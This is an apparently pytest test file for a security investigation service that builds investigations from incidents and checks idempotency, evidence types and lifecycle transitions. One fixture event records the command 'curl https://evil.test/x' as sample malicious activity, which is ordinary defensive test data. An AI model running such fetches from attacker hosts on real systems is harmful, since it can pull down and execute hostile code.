from datetime import UTC, datetime

import pytest
from sqlalchemy import func, select
from sqlalchemy.orm import Session

from app.models import Alert, AuditLog, Incident, Investigation, SecurityEvent
from app.services.investigation import InvalidInvestigationTransition, InvestigationService
from tests.conftest import TEST_ORG_ID


def test_create_from_incident_is_deterministic_and_idempotent(session: Session, endpoint) -> None:
    event = SecurityEvent(
        organization_id=TEST_ORG_ID,
        endpoint_id=endpoint.id,
        source="test",
        external_id="investigation-event",
        event_type="process",
        severity=8,
        occurred_at=datetime(2026, 9, 1, tzinfo=UTC),
        raw_payload={},
        normalized_data={"command_line": "curl https://evil.test/x"},
    )
    alert = Alert(
        organization_id=TEST_ORG_ID,
        endpoint_id=endpoint.id,
        source="test",
        external_id="investigation-alert",
        title="Detection",
        severity=8,
        occurred_at=event.occurred_at,
        rule_id="rule-1",
        evidence={"url": "https://evil.test/x"},
    )
    alert.security_events.append(event)
    incident = Incident(
        organization_id=TEST_ORG_ID,
        title="Incident",
        severity=8,
        priority="high",
        status="open",
        confidence=0.8,
        occurred_at=event.occurred_at,
        first_seen=event.occurred_at,
        last_seen=event.occurred_at,
        affected_endpoint_ids=[str(endpoint.id)],
        affected_users=[],
        source_ips=["203.0.113.8"],
        destination_ips=[],
        mitre_attack=[],
        evidence={"case": "unit"},
        timeline=[],
        sla_due_at=datetime(2026, 9, 2, tzinfo=UTC),
        alerts=[alert],
    )
    session.add_all([event, alert, incident])
    session.commit()

    service = InvestigationService(session, TEST_ORG_ID)
    first = service.create_from_incident(incident)
    session.commit()
    second = service.create_from_incident(incident)
    session.commit()

    assert first.id == second.id
    assert first.timeline == sorted(first.timeline, key=lambda item: item["occurred_at"])
    assert {item["type"] for item in first.evidence} >= {
        "assets",
        "events",
        "detections",
        "iocs",
        "context",
    }
    assert session.scalar(select(func.count()).select_from(Investigation)) == 1
    assert (
        session.scalar(
            select(func.count())
            .select_from(AuditLog)
            .where(AuditLog.action == "investigation.created")
        )
        == 1
    )


def test_investigation_lifecycle_is_deterministic_and_tenant_scoped(session: Session) -> None:
    incident = Incident(
        organization_id=TEST_ORG_ID,
        title="Lifecycle",
        severity=2,
        priority="low",
        status="open",
        confidence=0.5,
        occurred_at=datetime.now(UTC),
        first_seen=datetime.now(UTC),
        last_seen=datetime.now(UTC),
        affected_endpoint_ids=[],
        affected_users=[],
        source_ips=[],
        destination_ips=[],
        mitre_attack=[],
        evidence={},
        timeline=[],
        sla_due_at=datetime.now(UTC),
    )
    session.add(incident)
    session.commit()
    investigation = InvestigationService(session, TEST_ORG_ID).create_from_incident(incident)
    session.commit()

    with pytest.raises(InvalidInvestigationTransition):
        InvestigationService(session, TEST_ORG_ID).transition(
            investigation, TEST_ORG_ID, "in_progress"
        )
    InvestigationService(session, TEST_ORG_ID).transition(investigation, TEST_ORG_ID, "closed")
    session.commit()
    assert investigation.status == "closed"
